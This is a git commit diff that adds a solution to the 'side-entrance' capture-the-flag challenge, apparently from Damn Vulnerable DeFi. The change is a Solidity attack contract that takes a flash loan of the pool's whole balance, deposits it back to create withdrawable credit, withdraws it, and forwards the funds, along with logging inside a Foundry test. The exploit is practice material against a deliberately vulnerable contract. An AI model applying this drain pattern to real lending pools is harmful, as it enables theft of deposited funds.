4bcb013df9c69514f825b4c2310d6ff8c7bfcc2a
0xdeephunt <0xdeephunt@gmail.com>
2025-09-10 19:08:42 +0800

    Add the solution to side-entrance

--- test/side-entrance/SideEntrance.t.sol
+++ test/side-entrance/SideEntrance.t.sol
@@ -5,6 +5,31 @@ pragma solidity =0.8.25;
 import {Test, console} from "forge-std/Test.sol";
 import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";
 
+
+contract AttackSideEntrance {
+    SideEntranceLenderPool pool;
+    address owner;
+
+    constructor(address _pool, address _owner) {
+        pool = SideEntranceLenderPool(_pool);
+        owner = _owner;
+    }
+
+    function attack() external {
+        uint256 _amount = address(pool).balance;
+        pool.flashLoan(_amount);
+        pool.withdraw();
+        (bool success, ) = payable(owner).call{value: address(this).balance}("");
+        require(success, "Transfer failed");
+    }
+
+    function execute() external payable {
+        pool.deposit{value: msg.value}();
+    }
+
+    receive() external payable {}
+}
+
 contract SideEntranceChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -45,7 +70,31 @@ contract SideEntranceChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_sideEntrance() public checkSolvedByPlayer {
-        
+        console.log("### test_sideEntrance start ###");
+
+        console.log("");
+        console.log("#1 Before attack");
+        console.log("pool balance:", address(pool).balance/1e18);
+        console.log("player balance:", address(player).balance/1e18);
+        console.log("recovery balance:", address(recovery).balance/1e18);
+
+        console.log("");
+        console.log("#2 Run attack");
+        run_attack();
+
+        console.log("");
+        console.log("#3 After attack");
+        console.log("pool balance:", address(pool).balance/1e18);
+        console.log("player balance:", address(player).balance/1e18);
+        console.log("recovery balance:", address(recovery).balance/1e18);
+
+        console.log("");
+        console.log("### test_sideEntrance end ###");
+    }
+
+    function run_attack() internal {
+        AttackSideEntrance attackContract = new AttackSideEntrance(address(pool), recovery);
+        attackContract.attack();
     }
 
     /**
